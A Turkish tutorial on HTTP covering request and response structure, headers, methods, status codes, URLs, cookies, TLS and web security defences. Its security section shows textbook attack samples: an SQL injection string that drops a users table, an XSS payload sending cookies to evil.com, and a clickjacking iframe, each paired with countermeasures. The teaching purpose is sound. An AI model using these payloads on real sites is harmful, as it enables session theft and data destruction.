# HTTP Anatomisi 


---

## İçindekiler

1. [HTTP Nedir?](#1-http-nedir)
2. [HTTP Anatomisi](#2-http-anatomisi)
   - [Request (İstek) Yapısı](#21-request-istek-yapısı)
   - [Response (Yanıt) Yapısı](#22-response-yanıt-yapısı)
3. [Header (Başlık) Kavramı](#3-header-başlık-kavramı)
4. [Body (Gövde) Kavramı](#4-body-gövde-kavramı)
5. [HTTP Metotları (Request Tipleri)](#5-http-metotları-request-tipleri)
6. [HTTP Durum Kodları](#6-http-durum-kodları)
7. [URL Anatomisi](#8-url-anatomisi)
8. [Cookies ve Session](#9-cookies-ve-session)
9. [HTTPS ve Güvenlik](#10-https-ve-güvenlik)
10. [Güvenlik Tehditleri ve Önlemler](#11-güvenlik-tehditleri-ve-önlemler)

---

## 1. HTTP Nedir?

**HTTP** (HyperText Transfer Protocol), istemci (client) ile sunucu (server) arasında veri alışverişini sağlayan, metin tabanlı bir uygulama katmanı protokolüdür.

- **Katman:** OSI Modelinde 7. Katmanda yer alır. (Uygulama Katmanı)
- **Taşıma:** Genellikle TCP üzerinden çalışır.
- **Port:** Varsayılan olarak `80` (HTTP) ve `443` (HTTPS) portları üzerinden ayağa kalkar.
- **Durumsuz (Stateless):** Her istek birbirinden bağımsızdır; sunucu önceki isteği "hatırlamaz"

```
Tarayıcı (Client)  ←——— HTTP ———→  Web Sunucusu (Server)
     istek gönderir                   yanıt döner
```



## 2. HTTP Anatomisi

### 2.1 Request (İstek) Yapısı

Bir HTTP isteği 3 ana bölümden oluşur:

```
┌─────────────────────────────────────────────┐
│              REQUEST LINE                   │  ← Metot, URL, HTTP versiyonu
├─────────────────────────────────────────────┤
│              HEADERS                        │  ← Meta veriler
│              ...                            │
├─────────────────────────────────────────────┤
│              (boş satır)                    │  ← Header sonu işareti
├─────────────────────────────────────────────┤
│              BODY (opsiyonel)               │  ← Gönderilen veri
└─────────────────────────────────────────────┘
```

**Örnek:**

```http
POST /api/kullanici/giris HTTP/1.1
Host: www.example.com
Content-Type: application/json
Content-Length: 47
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Accept: application/json

{
  "email": "barneystinson@example.com",
  "sifre": "waitforit"
}
```

| Bölüm | Açıklama |
|---|---|
| `POST` | HTTP metodu |
| `/api/kullanici/giris` | Kaynak yolu (path) |
| `HTTP/1.1` | Protokol versiyonu |
| `Host`, `Content-Type`... | Header'lar |
| `{ "email": ... }` | Body (gövde) |

---

### 2.2 Response (Yanıt) Yapısı

```
┌─────────────────────────────────────────────┐
│              STATUS LINE                    │  ← HTTP versiyonu + Durum kodu
├─────────────────────────────────────────────┤
│              HEADERS                        │  ← Meta veriler
│              ...                            │
├─────────────────────────────────────────────┤
│              (boş satır)                    │
├─────────────────────────────────────────────┤
│              BODY                           │  ← Dönen veri (HTML, JSON vb.)
└─────────────────────────────────────────────┘
```

**Örnek:**

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 89
Set-Cookie: session=abc123; HttpOnly; Secure
Cache-Control: no-store

{
  "basarili": true,
  "token": "eyJhbGciOiJIUzI1NiJ9...",
  "kullanici": "Barney"
}
```

---

## 3. Header (Başlık) Kavramı

Header'lar, istek veya yanıt hakkında **meta bilgi** taşır. `Anahtar: Değer` formatındadır.

### 3.1 Genel (General) Header'lar

```http
Connection: keep-alive        # Bağlantıyı açık tut
Cache-Control: no-cache       # Önbelleği atla
Date: Mon, 12 Apr 2026 10:00:00 GMT
```

### 3.2 Request Header'ları

```http
Host: www.example.com                  # Hedef sunucu (zorunlu!)
User-Agent: Mozilla/5.0 ...            # İstemci bilgisi
Accept: text/html, application/json    # Kabul edilen format
Accept-Language: tr-TR, tr;q=0.9      # Dil tercihi
Accept-Encoding: gzip, deflate, br    # Sıkıştırma desteği
Authorization: Bearer <token>          # Kimlik doğrulama
Referer: https://google.com           # Önceki sayfa
Content-Type: application/json         # Gönderilen verinin formatı
Content-Length: 128                    # Body boyutu (byte)
Cookie: session=abc123                 # Tarayıcı cookie'si
Origin: https://app.example.com       # İsteğin kaynağı (CORS için)
```

### 3.3 Response Header'ları

```http
Content-Type: text/html; charset=UTF-8   # Dönen içerik formatı
Content-Length: 2048                      # İçerik boyutu
Content-Encoding: gzip                   # Sıkıştırma yöntemi
Cache-Control: max-age=3600              # Önbellekleme süresi
Set-Cookie: session=abc; HttpOnly        # Cookie tanımlama
Location: /yeni-sayfa                    # Yönlendirme adresi
ETag: "abc123def456"                     # Kaynak sürüm etiketi
Last-Modified: Mon, 13 Apr 2026 ...      # Son değişiklik tarihi
Access-Control-Allow-Origin: *           # CORS izni
X-Frame-Options: DENY                    # Clickjacking koruması
Strict-Transport-Security: max-age=...   # HTTPS zorunluluğu
```

### 3.4 Content-Type Değerleri

| Content-Type | Kullanım |
|---|---|
| `text/html` | HTML sayfaları |
| `application/json` | JSON verisi (API'ler) |
| `application/xml` | XML verisi |
| `text/plain` | Düz metin |
| `multipart/form-data` | Dosya yükleme formları |
| `application/x-www-form-urlencoded` | HTML form verisi |
| `image/png`, `image/jpeg` | Görsel dosyalar |
| `application/octet-stream` | İkili (binary) dosyalar |

---

## 4. Body (Gövde) Kavramı

Body, istek veya yanıtta taşınan **asıl veridir**. Her HTTP mesajında bulunmaz.

### Body Ne Zaman Kullanılır?

| Durum | Body Var mı? |
|---|---|
| GET isteği | Hayır (genellikle) |
| POST isteği (form/JSON) |  Evet |
| PUT/PATCH isteği |  Evet |
| DELETE isteği | Nadiren |
| Başarılı GET yanıtı | Evet |
| 204 No Content yanıtı | Hayır |
| 301 Redirect yanıtı | Opsiyonel |

### Body Format Örnekleri

**JSON (en yaygın):**
```json
{
  "ad": "Ali",
  "yas": 28,
  "roller": ["admin", "editor"]
}
```

**Form Data:**
```
ad=Ali&soyad=Yilmaz&yas=28
```

**Multipart (dosya yükleme):**
```
--boundary123
Content-Disposition: form-data; name="dosya"; filename="resim.png"
Content-Type: image/png

[binary veri...]
--boundary123--
```

---

## 5. HTTP Metotları (Request Tipleri)

### Temel Metotlar

| Metot | Amaç | Body | Idempotent | Güvenli |
|---|---|---|---|---|
| `GET` | Veri okuma | ❌ | ✅ | ✅ |
| `POST` | Yeni kayıt oluşturma | ✅ | ❌ | ❌ |
| `PUT` | Kaydı tamamen güncelleme | ✅ | ✅ | ❌ |
| `PATCH` | Kaydı kısmen güncelleme | ✅ | ⚠️ | ❌ |
| `DELETE` | Kayıt silme | ⚠️ | ✅ | ❌ |
| `HEAD` | Sadece header'ları alma | ❌ | ✅ | ✅ |
| `OPTIONS` | Desteklenen metotları sorgulama | ❌ | ✅ | ✅ |

> **Idempotent:** Aynı isteği birden fazla kez göndermek aynı sonucu üretir.  
> **Güvenli:** Sunucu tarafında hiçbir değişiklik yapmaz.

---

### GET — Veri Okuma

```http
GET /api/urunler?kategori=elektronik&sayfa=1 HTTP/1.1
Host: api.example.com
Accept: application/json
Authorization: Bearer <token>
```

- Parametreler URL'de taşınır (query string)
- Body gönderilmez
- Önbelleğe alınabilir

---

### POST — Yeni Kayıt Oluşturma

```http
POST /api/urunler HTTP/1.1
Host: api.example.com
Content-Type: application/json
Authorization: Bearer <token>

{
  "ad": "Laptop",
  "fiyat": 25000,
  "stok": 10
}
```

Yanıt:
```http
HTTP/1.1 201 Created
Location: /api/urunler/42
Content-Type: application/json

{
  "id": 42,
  "ad": "Laptop",
  "fiyat": 25000
}
```

---

### PUT — Tam Güncelleme

```http
PUT /api/urunler/42 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "ad": "Gaming Laptop",
  "fiyat": 30000,
  "stok": 5
}
```

> ⚠️ PUT tüm alanları değiştirir. Göndermediğiniz alan silinebilir!

---

### PATCH — Kısmi Güncelleme

```http
PATCH /api/urunler/42 HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "fiyat": 27000
}
```

> Sadece belirtilen alanları günceller, diğerleri korunur.

---

### DELETE — Silme

```http
DELETE /api/urunler/42 HTTP/1.1
Host: api.example.com
Authorization: Bearer <token>
```

Yanıt:
```http
HTTP/1.1 204 No Content
```

---

### HEAD — Sadece Header

```http
HEAD /api/urunler/42 HTTP/1.1
Host: api.example.com
```

> Body dönmez, sadece header'lar gelir. Dosya boyutu veya varlık kontrolü için kullanılır.

---

### OPTIONS — CORS Ön Sorgusu

```http
OPTIONS /api/urunler HTTP/1.1
Host: api.example.com
Origin: https://app.example.com
Access-Control-Request-Method: POST
```

Yanıt:
```http
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
```

---

## 6. HTTP Durum Kodları

Durum kodları 3 haneli sayılardır. İlk rakam kategoriyi belirtir.

### 1xx — Bilgi

| Kod | Açıklama |
|---|---|
| `100 Continue` | İstek alındı, devam et |
| `101 Switching Protocols` | Protokol değişimi (WebSocket) |

### 2xx — Başarı

| Kod | Açıklama | Kullanım |
|---|---|---|
| `200 OK` | Başarılı | GET, PUT, PATCH yanıtları |
| `201 Created` | Kaynak oluşturuldu | POST yanıtı |
| `204 No Content` | Başarılı, body yok | DELETE yanıtı |
| `206 Partial Content` | Kısmi içerik (büyük dosyalar) | Video streaming |

### 3xx — Yönlendirme 

| Kod | Açıklama | Kullanım |
|---|---|---|
| `301 Moved Permanently` | Kalıcı taşındı | HTTP → HTTPS geçişi |
| `302 Found` | Geçici yönlendirme | Login sonrası |
| `304 Not Modified` | Değişmedi, cache kullan | Performans |
| `307 Temporary Redirect` | Geçici, metodu koru | POST yönlendirme |
| `308 Permanent Redirect` | Kalıcı, metodu koru | POST yönlendirme |

### 4xx — İstemci Hatası

| Kod | Açıklama | Kullanım |
|---|---|---|
| `400 Bad Request` | Hatalı istek formatı | Geçersiz JSON |
| `401 Unauthorized` | Kimlik doğrulanmamış | Token eksik |
| `403 Forbidden` | Yetkisiz erişim | Yetki yetersiz |
| `404 Not Found` | Kaynak bulunamadı | Yanlış URL |
| `405 Method Not Allowed` | Metot desteklenmiyor | POST yerine GET |
| `409 Conflict` | Çakışma | Zaten var olan kayıt |
| `410 Gone` | Kalıcı olarak silindi | Eski URL |
| `422 Unprocessable Entity` | Doğrulama hatası | Eksik alan |
| `429 Too Many Requests` | Rate limit aşıldı | Çok fazla istek |

### 5xx — Sunucu Hatası

| Kod | Açıklama | Kullanım |
|---|---|---|
| `500 Internal Server Error` | Genel sunucu hatası | Kod hatası |
| `502 Bad Gateway` | Arka uç yanıt vermedi | Proxy/load balancer |
| `503 Service Unavailable` | Servis kullanılamıyor | Bakım modu |
| `504 Gateway Timeout` | Zaman aşımı | Yavaş backend |

---

## 8. URL Anatomisi

```
https://www.example.com:8080/urunler/detay?id=42&dil=tr#yorumlar
│      │   │           │    │               │            │
│      │   │           │    │               │            └── Fragment (hash)
│      │   │           │    │               └── Query String
│      │   │           │    └── Path
│      │   │           └── Port
│      │   └── Host (domain)
│      └── Subdomain
└── Scheme (protokol)
```

| Bileşen | Örnek | Açıklama |
|---|---|---|
| Scheme | `https` | Protokol |
| Host | `www.example.com` | Sunucu adresi |
| Port | `8080` | Port numarası (opsiyonel) |
| Path | `/urunler/detay` | Kaynak yolu |
| Query String | `?id=42&dil=tr` | Parametre çifti |
| Fragment | `#yorumlar` | Sayfa içi konum (sunucuya gitmez!) |

### URL Encoding

URL'de özel karakterler encode edilmelidir:

| Karakter | Encode |
|---|---|
| Boşluk | `%20` veya `+` |
| `@` | `%40` |
| `#` | `%23` |
| `&` | `%26` |
| `=` | `%3D` |
| `/` | `%2F` |

```
/arama?q=istanbul manzarası
        ↓ encode
/arama?q=istanbul%20manzaras%C4%B1
```


## 9. Cookies ve Session

### Cookie Nedir?

Sunucunun tarayıcıya küçük veri parçaları depolaması mekanizmasıdır. HTTP'nin stateless yapısını aşmak için kullanılır.

```http
# Sunucu cookie tanımlar:
Set-Cookie: session_id=abc123; Max-Age=3600; HttpOnly; Secure; SameSite=Strict

# Tarayıcı her sonraki istekte cookie gönderir:
Cookie: session_id=abc123
```

### Cookie Nitelikleri

| Nitelik | Açıklama |
|---|---|
| `HttpOnly` | JavaScript erişimini engeller (XSS koruması) |
| `Secure` | Sadece HTTPS üzerinden gönderilir |
| `SameSite=Strict` | Sadece aynı siteden gönderilir (CSRF koruması) |
| `SameSite=Lax` | Cross-site GET isteklerinde gönderilir |
| `SameSite=None` | Her yerden gönderilir (Secure ile birlikte) |
| `Max-Age=3600` | Geçerlilik süresi (saniye) |
| `Expires=...` | Geçerlilik tarihi |
| `Domain=.example.com` | Hangi domain için geçerli |
| `Path=/api` | Hangi path için geçerli |

### Session vs Token

| Özellik | Session (Cookie) | Token (JWT) |
|---|---|---|
| Depolama | Sunucu (DB/Memory) | İstemci (localStorage/cookie) |
| Ölçekleme | Zor (stateful) | Kolay (stateless) |
| Güvenlik | Sunucuda kontrol | İmzayla doğrulama |
| Boyut | Küçük (sadece ID) | Büyük (veri içerir) |
| Logout | Anlık | Token süresi dolana kadar |

---

## 10. HTTPS ve Güvenlik

### HTTPS Nedir?

HTTPS = HTTP + **TLS (Transport Layer Security)**

TLS, iletişimi şifreler ve kimlik doğrular:

```
HTTP:  veri → düz metin → 3. taraf okuyabilir 
HTTPS: veri → şifreli → 3. taraf okuyamaz 
```

### TLS El Sıkışması (Handshake)

```
İstemci                           Sunucu
   |                                 |
   |── ClientHello ────────────────→|  (desteklenen cipher'lar)
   |← ServerHello ──────────────────|  (seçilen cipher + sertifika)
   |                                 |
   |  [Sertifika doğrulaması]       |
   |                                 |
   |── Key Exchange ────────────────→|
   |← Finished ─────────────────────|
   |                                 |
   |═══════ Şifreli İletişim ═══════|
```

### Sertifika Türleri

| Tür | Açıklama | Kullanım |
|---|---|---|
| DV (Domain Validated) | Sadece domain doğrulanır | Kişisel siteler |
| OV (Organization Validated) | Kurum bilgisi doğrulanır | Kurumsal siteler |
| EV (Extended Validation) | En kapsamlı doğrulama | Bankalar, e-ticaret |
| Wildcard `*.example.com` | Alt domainleri kapsar | SaaS uygulamaları |

### Let's Encrypt

Ücretsiz, otomatik TLS sertifikası sunan sertifika otoritesi (CA). Certbot ile kolayca kurulabilir.

```bash
# Örnek: Nginx için sertifika kurma
certbot --nginx -d example.com -d www.example.com
```

---

## 11. Güvenlik Tehditleri ve Önlemler

### 11.1 Injection Saldırıları

**SQL Injection:**
```
# Saldırı
GET /arama?q='; DROP TABLE users; --

# Önlem: Parametrik sorgular kullan
SELECT * FROM urunler WHERE ad = ?  ← doğru
SELECT * FROM urunler WHERE ad = '" + input + "' ← TEHLİKELİ
```

**XSS (Cross-Site Scripting):**
```html
<!-- Saldırı: Kullanıcı girdisi direkt HTML'e yazılır -->
<p>Hoş geldin, <script>document.location='evil.com?c='+document.cookie</script></p>

<!-- Önlem: Girdiyi encode et -->
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
```

---

### 11.2 CSRF (Cross-Site Request Forgery)

```
1. Kullanıcı bank.com'a giriş yapar (cookie oluşur)
2. Saldırgan evil.com'a yönlendirir
3. evil.com, bank.com'a gizlice para transferi isteği gönderir
4. Tarayıcı cookie'yi otomatik ekler → işlem gerçekleşir! ⚠️
```

**Önlem:**
```http
# CSRF Token: Her formda benzersiz token
Set-Cookie: csrf_token=xyz789; SameSite=Strict

# SameSite cookie niteliği
Set-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure
```

---

### 11.3 Man-in-the-Middle (MITM)

```
İstemci → [Saldırgan araya giriyor] → Sunucu
```

**Önlemler:**
- Her zaman HTTPS kullan
- HSTS (HTTP Strict Transport Security) aktif et
- Sertifika pinning uygula

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### 11.4 Clickjacking

```html
<!-- Saldırı: Sayfa şeffaf iframe içine alınır -->
<iframe src="https://bank.com" style="opacity:0; position:absolute;"></iframe>
<button style="position:absolute;">Ücretsiz ödül al!</button>
```

**Önlem:**
```http
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'
```

---

### 11.5 Rate Limiting

Brute force ve DDoS saldırılarına karşı:

```http
# Çok fazla istek gönderildiğinde:
HTTP/1.1 429 Too Many Requests
Retry-After: 60
X-RateLimit-Limit: 100
X-RateLimit-Remaining: 0
X-RateLimit-Reset: 1712994000
```

---

### 11.6 Güvenli Header Listesi

Her HTTP yanıtında bulunması önerilen güvenlik header'ları:

```http
# İçerik tipi tahmini engelle
X-Content-Type-Options: nosniff

# Clickjacking engelle
X-Frame-Options: DENY

# XSS filtresi (eski tarayıcılar)
X-XSS-Protection: 1; mode=block

# Sadece HTTPS (1 yıl)
Strict-Transport-Security: max-age=31536000; includeSubDomains

# İçerik güvenlik politikası
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'

# Referrer bilgisini kısıtla
Referrer-Policy: strict-origin-when-cross-origin

# İzin politikası
Permissions-Policy: geolocation=(), microphone=(), camera=()
```

---

### 11.7 CORS (Cross-Origin Resource Sharing)

Farklı originden gelen istekleri kontrol eden mekanizma:

```
Origin A: https://app.example.com  →  API: https://api.example.com
                                        ↑
                              CORS burada devreye girer
```

```http
# Yanıtta origin izin ver
Access-Control-Allow-Origin: https://app.example.com  ← belirli origin
Access-Control-Allow-Origin: *  ← herkes (dikkatli kullan!)

# İzin verilen metotlar
Access-Control-Allow-Methods: GET, POST, PUT, DELETE

# İzin verilen headerlar
Access-Control-Allow-Headers: Content-Type, Authorization

# Preflight önbellekleme
Access-Control-Max-Age: 86400
```
